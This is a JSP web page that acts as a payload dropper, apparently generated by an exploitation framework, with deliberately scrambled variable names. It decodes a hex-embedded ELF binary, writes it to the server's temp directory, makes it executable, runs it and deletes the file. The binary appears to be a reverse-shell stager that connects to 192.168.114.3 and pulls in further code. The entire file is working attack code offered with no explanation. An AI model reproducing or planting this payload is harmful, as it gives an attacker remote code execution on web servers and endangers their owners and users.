<%@ page import="java.io.*" %>
<%
  String oMWFseXShB = "7f454c4601010100000000000000000002000300010000005480040834000000000000000000000034002000010000000000000001000000000000000080040800800408cf0000004a01000007000000001000006a0a5e31dbf7e35343536a02b06689e1cd80975b68c0a8720368020020fb89e16a665850515789e143cd8085c079194e743d68a2000000586a006a0589e331c9cd8085c079bdeb27b207b90010000089e3c1eb0cc1e30cb07dcd8085c078105b89e199b60cb003cd8085c07802ffe1b801000000bb01000000cd80";
  String ZSruOabaheAu = System.getProperty("java.io.tmpdir") + "/AnsekTCBbh";

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
    ZSruOabaheAu = ZSruOabaheAu.concat(".exe");
  }

  int rIcCYqQapz = oMWFseXShB.length();
  byte[] YTRnoLYKcVcyx = new byte[rIcCYqQapz/2];
  for (int TpihVeUBnch = 0; TpihVeUBnch < rIcCYqQapz; TpihVeUBnch += 2) {
    YTRnoLYKcVcyx[TpihVeUBnch / 2] = (byte) ((Character.digit(oMWFseXShB.charAt(TpihVeUBnch), 16) << 4)
                                              + Character.digit(oMWFseXShB.charAt(TpihVeUBnch+1), 16));
  }

  FileOutputStream FDshLBwvGN = new FileOutputStream(ZSruOabaheAu);
  FDshLBwvGN.write(YTRnoLYKcVcyx);
  FDshLBwvGN.flush();
  FDshLBwvGN.close();

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
    String[] CUcttLYSOf = new String[3];
    CUcttLYSOf[0] = "chmod";
    CUcttLYSOf[1] = "+x";
    CUcttLYSOf[2] = ZSruOabaheAu;
    Process yIRmlzLLgdl = Runtime.getRuntime().exec(CUcttLYSOf);
    if (yIRmlzLLgdl.waitFor() == 0) {
      yIRmlzLLgdl = Runtime.getRuntime().exec(ZSruOabaheAu);
    }

    File UkAHpsJtix = new File(ZSruOabaheAu); UkAHpsJtix.delete();
  } else {
    String[] psCRzqFYNRZq = new String[1];
    psCRzqFYNRZq[0] = ZSruOabaheAu;
    Process yIRmlzLLgdl = Runtime.getRuntime().exec(psCRzqFYNRZq);
  }
%>
